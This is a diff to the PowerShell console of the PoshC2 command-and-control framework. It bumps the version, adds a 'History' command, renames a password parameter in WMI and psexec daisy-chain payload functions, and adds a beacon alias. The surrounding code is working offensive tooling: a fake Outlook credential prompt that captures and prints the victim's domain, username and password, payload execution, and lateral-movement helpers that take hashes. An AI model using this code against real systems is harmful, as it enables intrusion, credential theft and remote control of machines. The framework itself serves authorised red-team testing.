@@ -118,7 +118,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v3.1 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v3.2 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host ""
             foreach ($implant in $dbresults) 
             { 
@@ -363,9 +363,16 @@ $header = '
                 start-process $FolderPath\payloads\payload.bat
                 $HelpOutput = "Pwning self......"
                 $HelpOutput
+            } elseif ($global:implantid.ToLower().StartsWith("history"))
+            {
+                $History = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM History" -As PSObject
+                foreach ($item in $History)
+                {
+                    $HelpOutput += $item.Command + "`n"
+                }
             } elseif ($global:implantid.ToLower().StartsWith("show-serverinfo"))
             {
-                $HelpOutput  = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
+                $HelpOutput = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                 $HelpOutput
             } elseif ($global:implantid.ToLower().StartsWith("createproxypayload")) 
             {
@@ -429,6 +436,7 @@ $header = '
         write-host `n "Server Commands: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
+        write-host " History"-ForegroundColor Green
         write-host " Output-To-HTML"-ForegroundColor Green
         write-host " Set-ClockworkSMSApiKey df2----"-ForegroundColor Green
         write-host " Set-ClockworkSMSNumber 44789----"-ForegroundColor Green
@@ -1152,7 +1160,7 @@ function invoke-wmidaisypayload {
     [Parameter(Mandatory=$true)][string]$name,
     [Parameter(Mandatory=$true)][string]$domain,
     [Parameter(Mandatory=$true)][string]$user,
-    [Parameter(Mandatory=$false)][string]$pass,
+    [Parameter(Mandatory=$false)][string]$password,
     [Parameter(Mandatory=$false)][string]$hash
     )
     if (Test-Path "$FolderPath\payloads\$($name).bat"){ 
@@ -1171,7 +1179,7 @@ function invoke-psexecdaisypayload {
     [Parameter(Mandatory=$true)][string]$name,
     [Parameter(Mandatory=$true)][string]$domain,
     [Parameter(Mandatory=$true)][string]$user,
-    [Parameter(Mandatory=$false)][string]$pass,
+    [Parameter(Mandatory=$false)][string]$password,
     [Parameter(Mandatory=$false)][string]$hash
     )
 
@@ -1934,9 +1942,10 @@ param
                 $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
                 write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
             }
-            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))-or ($pscommand.ToLower().StartsWith('set-beacon'))) 
+            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon')) -or ($pscommand.ToLower().StartsWith('set-beacon')) -or ($pscommand.ToLower().StartsWith('setbeacon'))) 
             {
                 $pscommand = $pscommand -replace 'set-beacon ', ''
+                $pscommand = $pscommand -replace 'setbeacon ', ''
                 $pscommand = $pscommand -replace 'sleep ', ''
                 $pscommand = $pscommand -replace 'beacon ', ''
                 $sleeptime = $pscommand
